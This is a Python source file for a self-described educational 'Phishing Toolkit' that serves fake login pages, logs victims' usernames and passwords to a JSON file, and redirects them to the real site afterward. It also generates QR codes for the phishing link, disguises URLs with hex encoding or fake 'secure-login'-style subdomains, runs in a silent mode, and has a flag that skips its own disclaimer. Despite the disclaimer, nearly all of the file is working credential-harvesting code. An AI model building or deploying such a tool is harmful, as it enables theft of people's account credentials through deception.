#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Phishing Toolkit - Educational Purposes Only
This tool is designed for educational purposes and ethical security testing in controlled environments.
"""

import os
import sys
import json
import time
import socket
import argparse
import subprocess
from datetime import datetime
try:
    import qrcode
    QR_AVAILABLE = True
except ImportError:
    QR_AVAILABLE = False

# Define colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Define paths
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PAGES_DIR = os.path.join(SCRIPT_DIR, "phishing_pages")
LOGS_DIR = os.path.join(SCRIPT_DIR, "logs")
OUTPUT_DIR = os.path.join(SCRIPT_DIR, "output")

# Ensure all directories exist
for directory in [PAGES_DIR, LOGS_DIR, OUTPUT_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

# Create log file if it doesn't exist
LOG_FILE = os.path.join(LOGS_DIR, "captured_credentials.json")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, 'w') as f:
        json.dump([], f)

def display_banner():
    """Display the toolkit banner"""
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗{Colors.ENDC}
{Colors.RED}║                                                               ║{Colors.ENDC}
{Colors.RED}║{Colors.YELLOW}  Phishing Toolkit - Educational Security Testing Tool      {Colors.RED}║{Colors.ENDC}
{Colors.RED}║{Colors.BLUE}  For controlled environments and authorized testing only   {Colors.RED}║{Colors.ENDC}
{Colors.RED}║                                                               ║{Colors.ENDC}
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.ENDC}

{Colors.BOLD}{Colors.RED}⚠️  WARNING: EDUCATIONAL USE ONLY  ⚠️{Colors.ENDC}
{Colors.YELLOW}This toolkit is designed for educational purposes and ethical security
testing in controlled environments only. Unauthorized use against systems
you do not own or have explicit permission to test is illegal and unethical.
Misuse may lead to legal consequences.{Colors.ENDC}
"""
    print(banner)

def display_legal_disclaimer():
    """Display legal disclaimer and get user acknowledgment"""
    disclaimer = f"""
{Colors.BOLD}{Colors.RED}LEGAL DISCLAIMER AND TERMS OF USE{Colors.ENDC}

This Phishing Toolkit is provided for {Colors.BOLD}educational purposes only{Colors.ENDC}.
By using this software, you agree to the following terms:

1. You will {Colors.BOLD}ONLY{Colors.ENDC} use this toolkit in environments you own or have
   explicit written permission to test.
   
2. You will {Colors.BOLD}NOT{Colors.ENDC} use this toolkit for:
   - Unauthorized access to systems
   - Stealing credentials from unwilling participants
   - Any illegal activities
   
3. You accept {Colors.BOLD}full responsibility{Colors.ENDC} for your use of this toolkit.

4. The creator of this toolkit is {Colors.BOLD}not responsible{Colors.ENDC} for any misuse
   or damage caused by this software.

{Colors.YELLOW}Do you understand and agree to these terms? (yes/no):{Colors.ENDC} """
    
    # Check if agreement has already been given
    agreement_file = os.path.join(SCRIPT_DIR, ".agreement")
    if os.path.exists(agreement_file):
        return True
    
    response = input(disclaimer)
    if response.lower() not in ['yes', 'y']:
        print(f"\n{Colors.RED}Agreement declined. Exiting program.{Colors.ENDC}")
        sys.exit(1)
    
    # Save agreement
    with open(agreement_file, 'w') as f:
        f.write(f"Agreement accepted on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    
    return True

def get_available_templates():
    """Get list of available phishing templates"""
    templates = []
    for item in os.listdir(PAGES_DIR):
        if os.path.isdir(os.path.join(PAGES_DIR, item)):
            templates.append(item)
    return templates

def get_local_ip():
    """Get the local IP address of the machine"""
    try:
        # Create a socket connection to determine the local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def start_phishing_server(template, port=8080, silent=False):
    """Start the phishing server with the selected template"""
    template_dir = os.path.join(PAGES_DIR, template)
    if not os.path.exists(template_dir):
        print(f"{Colors.RED}Error: Template '{template}' not found.{Colors.ENDC}")
        return False
    
    local_ip = get_local_ip()
    
    print(f"\n{Colors.GREEN}Starting phishing server...{Colors.ENDC}")
    print(f"{Colors.BLUE}Template: {Colors.BOLD}{template}{Colors.ENDC}")
    print(f"{Colors.BLUE}Local URL: {Colors.BOLD}http://{local_ip}:{port}/{Colors.ENDC}")
    
    # Copy server.py to template directory if it doesn't exist
    server_file = os.path.join(SCRIPT_DIR, "server.py")
    template_server = os.path.join(template_dir, "server.py")
    
    if not os.path.exists(template_server):
        with open(server_file, 'r') as src, open(template_server, 'w') as dst:
            dst.write(src.read())
    
    # Start the server
    try:
        if silent:
            subprocess.Popen(
                [sys.executable, template_server, str(port)],
                cwd=template_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                [sys.executable, template_server, str(port)],
                cwd=template_dir
            )
        
        print(f"\n{Colors.GREEN}Server started successfully!{Colors.ENDC}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop the server when done.{Colors.ENDC}")
        
        # Generate QR code if available
        if QR_AVAILABLE:
            generate_qr_code(f"http://{local_ip}:{port}/", template)
        
        return True
    except Exception as e:
        print(f"{Colors.RED}Error starting server: {str(e)}{Colors.ENDC}")
        return False

def generate_qr_code(url, template):
    """Generate QR code for the phishing URL"""
    if not QR_AVAILABLE:
        print(f"{Colors.YELLOW}QR code generation not available. Install 'qrcode' package.{Colors.ENDC}")
        return False
    
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Save QR code
        qr_file = os.path.join(OUTPUT_DIR, f"{template}_qr.png")
        img.save(qr_file)
        
        print(f"{Colors.GREEN}QR code generated: {Colors.BOLD}{qr_file}{Colors.ENDC}")
        return True
    except Exception as e:
        print(f"{Colors.RED}Error generating QR code: {str(e)}{Colors.ENDC}")
        return False

def obfuscate_url(url):
    """Obfuscate the phishing URL"""
    print(f"\n{Colors.BLUE}URL Obfuscation Options:{Colors.ENDC}")
    print(f"{Colors.YELLOW}1. Convert to hexadecimal format{Colors.ENDC}")
    print(f"{Colors.YELLOW}2. Add fake subdomain{Colors.ENDC}")
    print(f"{Colors.YELLOW}3. Return to main menu{Colors.ENDC}")
    
    choice = input(f"\n{Colors.GREEN}Select an option [1-3]: {Colors.ENDC}")
    
    if choice == '1':
        # Convert to hexadecimal
        parts = url.split('://')
        if len(parts) > 1:
            protocol = parts[0] + '://'
            domain = parts[1]
            
            # Convert domain to hex
            hex_domain = ""
            for char in domain:
                hex_domain += f"\\x{ord(char):02x}"
            
            obfuscated = f"{protocol}{hex_domain}"
            print(f"\n{Colors.GREEN}Hexadecimal URL: {Colors.BOLD}{obfuscated}{Colors.ENDC}")
            return obfuscated
        else:
            print(f"{Colors.RED}Invalid URL format.{Colors.ENDC}")
            return url
    
    elif choice == '2':
        # Add fake subdomain
        parts = url.split('://')
        if len(parts) > 1:
            protocol = parts[0] + '://'
            domain = parts[1]
            
            fake_domains = [
                "secure-login",
                "account-verify",
                "signin-secure",
                "auth-portal",
                "login-confirm"
            ]
            
            import random
            fake = random.choice(fake_domains)
            
            obfuscated = f"{protocol}{fake}.{domain}"
            print(f"\n{Colors.GREEN}Subdomain URL: {Colors.BOLD}{obfuscated}{Colors.ENDC}")
            return obfuscated
        else:
            print(f"{Colors.RED}Invalid URL format.{Colors.ENDC}")
            return url
    
    else:
        return url

def view_captured_credentials():
    """View captured credentials from the log file"""
    if not os.path.exists(LOG_FILE) or os.path.getsize(LOG_FILE) == 0:
        print(f"\n{Colors.YELLOW}No credentials have been captured yet.{Colors.ENDC}")
        return
    
    try:
        with open(LOG_FILE, 'r') as f:
            credentials = json.load(f)
        
        if not credentials:
            print(f"\n{Colors.YELLOW}No credentials have been captured yet.{Colors.ENDC}")
            return
        
        print(f"\n{Colors.GREEN}Captured Credentials:{Colors.ENDC}")
        print(f"{Colors.BLUE}{'='*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}{'Timestamp':<25} {'IP Address':<15} {'Username':<20} {'Password':<20}{Colors.ENDC}")
        print(f"{Colors.BLUE}{'-'*60}{Colors.ENDC}")
        
        for entry in credentials:
            print(f"{entry.get('timestamp', 'N/A'):<25} {entry.get('ip', 'N/A'):<15} {entry.get('username', 'N/A'):<20} {entry.get('password', 'N/A'):<20}")
        
        print(f"{Colors.BLUE}{'='*60}{Colors.ENDC}")
        print(f"{Colors.GREEN}Total entries: {len(credentials)}{Colors.ENDC}")
    
    except Exception as e:
        print(f"{Colors.RED}Error reading credentials: {str(e)}{Colors.ENDC}")

def add_custom_template():
    """Add a new custom phishing template"""
    print(f"\n{Colors.GREEN}Add Custom Phishing Template{Colors.ENDC}")
    
    template_name = input(f"{Colors.YELLOW}Enter template name (e.g., 'twitter'): {Colors.ENDC}")
    
    if not template_name or template_name.strip() == "":
        print(f"{Colors.RED}Invalid template name.{Colors.ENDC}")
        return False
    
    # Sanitize template name
    template_name = template_name.lower().strip().replace(" ", "_")
    
    # Create template directory
    template_dir = os.path.join(PAGES_DIR, template_name)
    
    if os.path.exists(template_dir):
        print(f"{Colors.RED}Template '{template_name}' already exists.{Colors.ENDC}")
        return False
    
    os.makedirs(template_dir)
    
    print(f"\n{Colors.GREEN}Template directory created: {template_dir}{Colors.ENDC}")
    print(f"{Colors.YELLOW}Please add the following files to this directory:{Colors.ENDC}")
    print(f"  - index.html (the phishing page)")
    print(f"  - style.css (optional)")
    print(f"  - script.js (optional)")
    
    # Create a basic template for index.html
    index_file = os.path.join(template_dir, "index.html")
    with open(index_file, 'w') as f:
        f.write("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form id="login-form" action="capture.php" method="post">
            <div class="input-group">
                <label for="username">Username or Email</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit">Login</button>
        </form>
    </div>
    <script src="script.js"></script>
</body>
</html>""")
    
    # Create a basic template for style.css
    css_file = os.path.join(template_dir, "style.css")
    with open(css_file, 'w') as f:
        f.write("""body {
    font-family: Arial, sans-serif;
    background-color: #f0f2f5;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.login-container {
    background-color: white;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
    padding: 20px;
    width: 350px;
}

h2 {
    text-align: center;
    color: #333;
}

.input-group {
    margin-bottom: 15px;
}

label {
    display: block;
    margin-bottom: 5px;
    color: #333;
}

input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    box-sizing: border-box;
}

button {
    width: 100%;
    padding: 10px;
    background-color: #1877f2;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}

button:hover {
    background-color: #166fe5;
}""")
    
    # Create a basic template for script.js
    js_file = os.path.join(template_dir, "script.js")
    with open(js_file, 'w') as f:
        f.write("""document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Send data to the server
    fetch('capture.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => {
        // Redirect to the real site after capturing credentials
        window.location.href = 'https://original-site.com';
    })
    .catch(error => {
        console.error('Error:', error);
    });
});""")
    
    # Create capture.php file
    capture_file = os.path.join(template_dir, "capture.php")
    with open(capture_file, 'w') as f:
        f.write("""<?php
// This file would normally handle the credential capture
// For our Python-based toolkit, this is just a placeholder
// The actual capturing is done by server.py

// Redirect to the real site
header('Location: https://original-site.com');
exit;
?>""")
    
    print(f"\n{Colors.GREEN}Basic template files created.{Colors.ENDC}")
    print(f"{Colors.YELLOW}Edit these files to create your custom phishing page.{Colors.ENDC}")
    
    return True

def cleanup_toolkit():
    """Clean up logs and stop servers"""
    print(f"\n{Colors.YELLOW}Cleanup Options:{Colors.ENDC}")
    print(f"{Colors.BLUE}1. Delete all captured credentials{Colors.ENDC}")
    print(f"{Colors.BLUE}2. Stop all running servers{Colors.ENDC}")
    print(f"{Colors.BLUE}3. Both 1 & 2{Colors.ENDC}")
    print(f"{Colors.BLUE}4. Return to main menu{Colors.ENDC}")
    
    choice = input(f"\n{Colors.GREEN}Select an option [1-4]: {Colors.ENDC}")
    
    if choice in ['1', '3']:
        # Delete credentials
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
            with open(LOG_FILE, 'w') as f:
                json.dump([], f)
            print(f"{Colors.GREEN}All captured credentials deleted.{Colors.ENDC}")
    
    if choice in ['2', '3']:
        # Stop servers
        try:
            # Find and kill Python server processes
            os.system("pkill -f 'python.*server.py'")
            print(f"{Colors.GREEN}All running servers stopped.{Colors.ENDC}")
        except:
            print(f"{Colors.RED}Error stopping servers.{Colors.ENDC}")
    
    if choice not in ['1', '2', '3', '4']:
        print(f"{Colors.RED}Invalid option.{Colors.ENDC}")

def main_menu():
    """Display the main menu and handle user choices"""
    while True:
        print(f"\n{Colors.BLUE}{'='*60}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.GREEN}PHISHING TOOLKIT - MAIN MENU{Colors.ENDC}")
        print(f"{Colors.BLUE}{'='*60}{Colors.ENDC}")
        
        print(f"{Colors.YELLOW}1. Launch Phishing Server{Colors.ENDC}")
        print(f"{Colors.YELLOW}2. URL Obfuscation Tools{Colors.ENDC}")
        print(f"{Colors.YELLOW}3. View Captured Credentials{Colors.ENDC}")
        print(f"{Colors.YELLOW}4. Add Custom Template{Colors.ENDC}")
        print(f"{Colors.YELLOW}5. Cleanup & Maintenance{Colors.ENDC}")
        print(f"{Colors.RED}6. Exit{Colors.ENDC}")
        
        choice = input(f"\n{Colors.GREEN}Select an option [1-6]: {Colors.ENDC}")
        
        if choice == '1':
            # Launch phishing server
            templates = get_available_templates()
            
            if not templates:
                print(f"\n{Colors.RED}No templates found. Please add templates first.{Colors.ENDC}")
                continue
            
            print(f"\n{Colors.BLUE}Available Templates:{Colors.ENDC}")
            for i, template in enumerate(templates, 1):
                print(f"{Colors.YELLOW}{i}. {template}{Colors.ENDC}")
            
            template_choice = input(f"\n{Colors.GREEN}Select a template [1-{len(templates)}]: {Colors.ENDC}")
            
            try:
                template_index = int(template_choice) - 1
                if template_index < 0 or template_index >= len(templates):
                    raise ValueError
                
                selected_template = templates[template_index]
                
                port = input(f"{Colors.GREEN}Enter port number [default: 8080]: {Colors.ENDC}")
                if not port:
                    port = 8080
                else:
                    port = int(port)
                
                silent_mode = input(f"{Colors.GREEN}Run in silent mode? (y/n) [default: n]: {Colors.ENDC}")
                silent = silent_mode.lower() in ['y', 'yes']
                
                start_phishing_server(selected_template, port, silent)
                
                # After starting the server, provide URL for obfuscation
                local_ip = get_local_ip()
                url = f"http://{local_ip}:{port}/"
                
                obfuscate = input(f"\n{Colors.GREEN}Would you like to obfuscate this URL? (y/n): {Colors.ENDC}")
                if obfuscate.lower() in ['y', 'yes']:
                    obfuscate_url(url)
            
            except ValueError:
                print(f"{Colors.RED}Invalid choice.{Colors.ENDC}")
            
            except Exception as e:
                print(f"{Colors.RED}Error: {str(e)}{Colors.ENDC}")
        
        elif choice == '2':
            # URL Obfuscation
            url = input(f"\n{Colors.GREEN}Enter URL to obfuscate: {Colors.ENDC}")
            if url:
                obfuscate_url(url)
            else:
                print(f"{Colors.RED}No URL provided.{Colors.ENDC}")
        
        elif choice == '3':
            # View captured credentials
            view_captured_credentials()
        
        elif choice == '4':
            # Add custom template
            add_custom_template()
        
        elif choice == '5':
            # Cleanup & Maintenance
            cleanup_toolkit()
        
        elif choice == '6':
            # Exit
            print(f"\n{Colors.GREEN}Exiting Phishing Toolkit. Goodbye!{Colors.ENDC}")
            sys.exit(0)
        
        else:
            print(f"{Colors.RED}Invalid choice. Please try again.{Colors.ENDC}")
        
        input(f"\n{Colors.BLUE}Press Enter to continue...{Colors.ENDC}")
        os.system('clear' if os.name == 'posix' else 'cls')
        display_banner()

def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description='Phishing Toolkit - Educational Purposes Only')
    parser.add_argument('--silent', action='store_true', help='Run in silent mode')
    parser.add_argument('--template', type=str, help='Specify template to use')
    parser.add_argument('--port', type=int, default=8080, help='Specify port number')
    parser.add_argument('--skip-disclaimer', action='store_true', help='Skip legal disclaimer')
    
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_arguments()
    
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    
    if not args.skip_disclaimer:
        display_legal_disclaimer()
    
    if args.template:
        # Direct launch with template
        start_phishing_server(args.template, args.port, args.silent)
        input(f"\n{Colors.BLUE}Press Enter to exit...{Colors.ENDC}")
    else:
        # Interactive menu
        main_menu()
